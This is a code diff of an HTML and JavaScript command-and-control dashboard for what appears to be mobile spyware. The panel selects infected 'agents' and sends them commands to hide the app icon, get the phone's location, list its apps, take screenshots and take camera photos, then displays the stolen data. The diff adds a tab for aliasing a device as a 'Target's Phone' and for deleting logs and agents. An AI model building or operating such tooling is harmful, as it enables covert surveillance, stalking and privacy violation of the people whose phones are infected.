@@ -11,7 +11,7 @@
         :root {
             --bg-primary: #0a0c10; --bg-secondary: #161b22; --border-color: #2a313c;
             --text-primary: #e6edf3; --text-secondary: #7d8590; --accent-cyan: #00ffff;
-            --glow-cyan: rgba(0, 255, 255, 0.4); --success: #28a745; --error: #dc3545;
+            --glow-cyan: rgba(0, 255, 255, 0.4); --success: #28a745; --error: #dc3545; --warning: #ffc107;
             --font-display: 'Orbitron', sans-serif; --font-mono: 'Roboto Mono', monospace;
         }
         * { box-sizing: border-box; }
@@ -31,7 +31,7 @@
             border-bottom: 1px solid var(--border-color); letter-spacing: 2px;
         }
         .card-body { padding: 28px; }
-        .tabs { display: flex; border-bottom: 1px solid var(--border-color); margin-bottom: 24px; }
+        .tabs { display: flex; flex-wrap: wrap; border-bottom: 1px solid var(--border-color); margin-bottom: 24px; }
         .tab-button {
             padding: 12px 18px; cursor: pointer; background: none; border: none; color: var(--text-secondary);
             font-size: 0.9em; font-weight: 600; font-family: var(--font-mono);
@@ -44,17 +44,20 @@
         @keyframes tabFade { from { opacity: 0; } to { opacity: 1; } }
         .form-group { margin-bottom: 20px; }
         .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: var(--text-secondary); font-size: 0.9em; }
-        select {
+        select, input[type="text"] {
             width: 100%; padding: 12px; background-color: var(--bg-primary); border: 1px solid var(--border-color);
             border-radius: 8px; color: var(--text-primary); font-size: 1em; font-family: var(--font-mono);
         }
-        select:focus { outline: none; border-color: var(--accent-cyan); box-shadow: 0 0 10px var(--glow-cyan); }
-        button.transmit-btn {
-            width: 100%; padding: 14px; background: linear-gradient(90deg, #00c3ff, #007bff);
-            border: none; border-radius: 8px; color: white; font-size: 1em; font-weight: 600;
-            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 15px var(--glow-cyan);
+        select:focus, input[type="text"]:focus { outline: none; border-color: var(--accent-cyan); box-shadow: 0 0 10px var(--glow-cyan); }
+        .action-button {
+            width: 100%; padding: 14px; border-radius: 8px; font-size: 1em; font-weight: 600;
+            cursor: pointer; transition: all 0.3s ease; border: none;
         }
-        button.transmit-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px var(--glow-cyan); }
+        .transmit-btn { background: linear-gradient(90deg, #00c3ff, #007bff); color: white; box-shadow: 0 0 15px var(--glow-cyan); }
+        .transmit-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px var(--glow-cyan); }
+        .save-btn { background-color: var(--success); color: white; }
+        .delete-btn { background-color: var(--error); color: white; }
+        .warning-btn { background-color: var(--warning); color: #111; }
         .data-output-container {
             height: 400px; background-color: var(--bg-primary); border-radius: 8px;
             border: 1px solid var(--border-color); padding: 15px; overflow-y: auto;
@@ -85,31 +88,38 @@
                 <button class="tab-button" data-tab="intel-tab">INTEL</button>
                 <button class="tab-button" data-tab="visuals-tab">VISUALS</button>
                 <button class="tab-button" data-tab="raw-logs-tab">RAW LOGS</button>
+                <button class="tab-button" data-tab="settings-tab">SETTINGS</button>
             </nav>
             
             <div id="control-tab" class="tab-content active">
                 <div class="form-group"><label for="selectDevice">SELECT AGENT</label><select id="selectDevice"><option>-- Searching... --</option></select></div>
                 <div class="form-group"><label for="selectCommand">SELECT COMMAND</label><select id="selectCommand"><optgroup label="Stealth"><option value="toggle_icon_hide">Hide App Icon</option><option value="toggle_icon_show">Show App Icon</option></optgroup><optgroup label="Recon"><option value="get_location">Get Location</option><option value="list_apps">List Installed Apps</option></optgroup><optgroup label="Surveillance"><option value="screenshot">Take Screenshot</option><option value="picture_back">Take Picture (Back)</option></optgroup></select></div>
-                <button id="btnTransmit" class="transmit-btn">TRANSMIT</button>
+                <button id="btnTransmit" class="action-button transmit-btn">TRANSMIT</button>
             </div>
-
-            <div id="intel-tab" class="tab-content">
-                 <div id="intel-output" class="data-output-container">Awaiting structured data...</div>
-            </div>
-
-            <div id="visuals-tab" class="tab-content">
-                <div id="visuals-output" class="data-output-container visuals-gallery">Awaiting visual data...</div>
-            </div>
-
-            <div id="raw-logs-tab" class="tab-content">
-                <div id="raw-logs-output" class="data-output-container">Awaiting raw logs...</div>
-            </div>
+            <div id="intel-tab" class="tab-content"><div id="intel-output" class="data-output-container">Awaiting structured data...</div></div>
+            <div id="visuals-tab" class="tab-content"><div id="visuals-output" class="data-output-container visuals-gallery">Awaiting visual data...</div></div>
+            <div id="raw-logs-tab" class="tab-content"><div id="raw-logs-output" class="data-output-container">Awaiting raw logs...</div></div>
             
+            <div id="settings-tab" class="tab-content">
+                <div class="form-group">
+                    <label for="deviceAliasInput">AGENT ALIAS (NAME)</label>
+                    <input type="text" id="deviceAliasInput" placeholder="e.g., Target's Phone">
+                </div>
+                <button id="btnSaveAlias" class="action-button save-btn" style="margin-bottom: 24px;">SAVE ALIAS</button>
+                <hr style="border-color: var(--border-color); margin-bottom: 24px;">
+                <div class="form-group">
+                    <label>DESTRUCTIVE ACTIONS</label>
+                    <button id="btnClearLogs" class="action-button warning-btn">CLEAR LOGS FOR THIS AGENT</button>
+                    <button id="btnDeleteAgent" class="action-button delete-btn" style="margin-top: 10px;">DELETE THIS AGENT</button>
+                </div>
+            </div>
+
             <div id="statusBar" class="status-bar status-idle">SYSTEM IDLE</div>
         </div>
     </div>
 
     <script>
+        // DOM Elements
         const selectDevice = document.getElementById('selectDevice');
         const selectCommand = document.getElementById('selectCommand');
         const btnTransmit = document.getElementById('btnTransmit');
@@ -117,10 +127,16 @@
         const intelOutput = document.getElementById('intel-output');
         const visualsOutput = document.getElementById('visuals-output');
         const rawLogsOutput = document.getElementById('raw-logs-output');
+        const deviceAliasInput = document.getElementById('deviceAliasInput');
+        const btnSaveAlias = document.getElementById('btnSaveAlias');
+        const btnClearLogs = document.getElementById('btnClearLogs');
+        const btnDeleteAgent = document.getElementById('btnDeleteAgent');
         const tabs = document.querySelectorAll('.tab-button');
         const tabContents = document.querySelectorAll('.tab-content');
+        
         const API_BASE = '/.netlify/functions';
         let devices = [];
+        let selectedDevice = null;
 
         function setStatus(message, type) { statusBar.textContent = message; statusBar.className = `status-bar status-${type}`; }
         
@@ -136,22 +152,41 @@
                 const response = await fetch(`${API_BASE}/get-devices`);
                 if (!response.ok) throw new Error(`Server ${response.status}`);
                 devices = await response.json();
+                const currentSelectedId = selectedDevice ? selectedDevice.deviceId : null;
                 selectDevice.innerHTML = '<option value="" disabled selected>-- Select an Agent --</option>';
-                if (devices.length === 0) { selectDevice.innerHTML = '<option value="" disabled selected>-- No Agents Found --</option>'; }
-                else { devices.forEach(device => { const option = document.createElement('option'); option.value = device.token; option.textContent = device.deviceId; selectDevice.appendChild(option); }); }
+                if (devices.length === 0) {
+                    selectDevice.innerHTML = '<option value="" disabled selected>-- No Agents Found --</option>';
+                } else {
+                    devices.forEach(device => {
+                        const option = document.createElement('option');
+                        option.value = device.deviceId;
+                        option.textContent = device.alias || device.deviceId;
+                        selectDevice.appendChild(option);
+                    });
+                    if(currentSelectedId) selectDevice.value = currentSelectedId;
+                }
             } catch (error) { setStatus(`Error fetching agents: ${error.message}`, 'error'); selectDevice.innerHTML = '<option value="" disabled selected>-- Error --</option>'; }
         }
 
+        function updateSelectedDevice() {
+            const selectedId = selectDevice.value;
+            selectedDevice = devices.find(d => d.deviceId === selectedId);
+            if(selectedDevice) {
+                deviceAliasInput.value = selectedDevice.alias || '';
+                fetchDeviceData();
+            }
+        }
+
         async function transmitCommand() {
-            const token = selectDevice.value; const commandValue = selectCommand.value;
-            if (!token || !commandValue) { return setStatus('Agent and Command must be selected.', 'error'); }
+            if (!selectedDevice) return setStatus('Agent and Command must be selected.', 'error');
+            const commandValue = selectCommand.value;
             let action; let payload = {};
             if (commandValue.startsWith('toggle_icon')) { action = 'toggle_icon'; payload.show = commandValue.endsWith('show') ? 'true' : 'false'; }
             else if (commandValue === 'picture_back') { action = 'picture'; payload.camera_id = '0'; }
             else { action = commandValue; }
             setStatus(`Transmitting [${action}]...`, 'sending');
             try {
-                const response = await fetch(`${API_BASE}/send-command`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token, action, ...payload }) });
+                const response = await fetch(`${API_BASE}/send-command`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedDevice.token, action, ...payload }) });
                 const result = await response.json();
                 if (!response.ok) throw new Error(result.error || `Server ${response.status}`);
                 setStatus(`Signal sent. Querying for results in 5s...`, 'success');
@@ -160,35 +195,26 @@
         }
 
         async function fetchDeviceData() {
-            const token = selectDevice.value; if(!token) return; const device = devices.find(d => d.token === token); if(!device) return;
+            if (!selectedDevice) return;
             setStatus('Querying for data packets...', 'sending');
             try {
-                const response = await fetch(`${API_BASE}/get-device-data?deviceId=${device.deviceId}`);
+                const response = await fetch(`${API_BASE}/get-device-data?deviceId=${selectedDevice.deviceId}`);
                 if (!response.ok) throw new Error(`Server ${response.status}`);
                 const data = await response.json();
                 
-                intelOutput.innerHTML = '';
-                visualsOutput.innerHTML = '';
-                rawLogsOutput.innerHTML = '';
+                intelOutput.innerHTML = ''; visualsOutput.innerHTML = ''; rawLogsOutput.innerHTML = '';
                 let intelCount = 0, visualsCount = 0, logsCount = 0;
 
                 data.forEach(item => {
                     const dataType = item.dataType;
-                    if (dataType === 'location' || dataType === 'installed_apps') {
-                        renderIntel(item);
-                        intelCount++;
-                    } else if (dataType === 'screenshot' || dataType === 'picture') {
-                        renderVisual(item);
-                        visualsCount++;
-                    } else {
-                        renderRawLog(item);
-                        logsCount++;
-                    }
+                    if (dataType === 'location' || dataType === 'installed_apps') { renderIntel(item); intelCount++; }
+                    else if (dataType === 'screenshot' || dataType === 'picture') { renderVisual(item); visualsCount++; }
+                    else { renderRawLog(item); logsCount++; }
                 });
 
-                if (intelCount === 0) intelOutput.innerHTML = 'No structured data found for this agent.';
-                if (visualsCount === 0) visualsOutput.innerHTML = 'No visual data found for this agent.';
-                if (logsCount === 0) rawLogsOutput.innerHTML = 'No raw logs found for this agent.';
+                if (intelCount === 0) intelOutput.innerHTML = 'No structured data found.';
+                if (visualsCount === 0) visualsOutput.innerHTML = 'No visual data found.';
+                if (logsCount === 0) rawLogsOutput.innerHTML = 'No raw logs found.';
 
                 setStatus(`Query complete. Found ${intelCount} intel, ${visualsCount} visuals, ${logsCount} logs.`, 'success');
             } catch (error) { setStatus(`Failed to fetch data: ${error.message}`, 'error'); }
@@ -212,10 +238,7 @@
         function renderVisual(item) {
             const visualDiv = document.createElement('div');
             visualDiv.className = 'visual-item';
-            visualDiv.innerHTML = `
-                <img src="data:image/jpeg;base64,${item.payload}" class="log-image" alt="${item.dataType}">
-                <p>${item.dataType.toUpperCase()} @ ${new Date(item.timestamp).toLocaleTimeString()}</p>
-            `;
+            visualDiv.innerHTML = `<img src="data:image/jpeg;base64,${item.payload}" class="log-image" alt="${item.dataType}"><p>${item.dataType.toUpperCase()} @ ${new Date(item.timestamp).toLocaleTimeString()}</p>`;
             visualsOutput.appendChild(visualDiv);
         }
 
@@ -227,8 +250,50 @@
             rawLogsOutput.appendChild(logEntry);
         }
 
+        async function saveAlias() {
+            if (!selectedDevice) return setStatus('No agent selected.', 'error');
+            const alias = deviceAliasInput.value;
+            setStatus('Saving alias...', 'sending');
+            try {
+                const response = await fetch(`${API_BASE}/set-alias`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId: selectedDevice.deviceId, alias }) });
+                if (!response.ok) throw new Error(`Server ${response.status}`);
+                setStatus('Alias saved successfully.', 'success');
+                await fetchDevices();
+                selectDevice.value = selectedDevice.deviceId;
+            } catch (error) { setStatus(`Failed to save alias: ${error.message}`, 'error'); }
+        }
+
+        async function clearLogs() {
+            if (!selectedDevice) return setStatus('No agent selected.', 'error');
+            if (!confirm(`Are you sure you want to delete all logs for ${selectedDevice.alias || selectedDevice.deviceId}? THIS CANNOT BE UNDONE.`)) return;
+            setStatus('Deleting logs...', 'sending');
+            try {
+                const response = await fetch(`${API_BASE}/delete-logs`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId: selectedDevice.deviceId }) });
+                if (!response.ok) throw new Error(`Server ${response.status}`);
+                setStatus('All logs for this agent have been deleted.', 'success');
+                fetchDeviceData();
+            } catch (error) { setStatus(`Failed to delete logs: ${error.message}`, 'error'); }
+        }
+
+        async function deleteAgent() {
+            if (!selectedDevice) return setStatus('No agent selected.', 'error');
+            if (!confirm(`!! WARNING !!\n\nAre you sure you want to permanently delete agent ${selectedDevice.alias || selectedDevice.deviceId} and all its data? THIS CANNOT BE UNDONE.`)) return;
+            setStatus('Deleting agent...', 'sending');
+            try {
+                const response = await fetch(`${API_BASE}/delete-device`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId: selectedDevice.deviceId }) });
+                if (!response.ok) throw new Error(`Server ${response.status}`);
+                setStatus('Agent has been permanently deleted.', 'success');
+                selectedDevice = null;
+                deviceAliasInput.value = '';
+                fetchDevices();
+            } catch (error) { setStatus(`Failed to delete agent: ${error.message}`, 'error'); }
+        }
+
         btnTransmit.addEventListener('click', transmitCommand);
-        selectDevice.addEventListener('change', fetchDeviceData); // Fetch data when a new device is selected
+        selectDevice.addEventListener('change', updateSelectedDevice);
+        btnSaveAlias.addEventListener('click', saveAlias);
+        btnClearLogs.addEventListener('click', clearLogs);
+        btnDeleteAgent.addEventListener('click', deleteAgent);
         window.onload = fetchDevices;
     </script>
 </body>
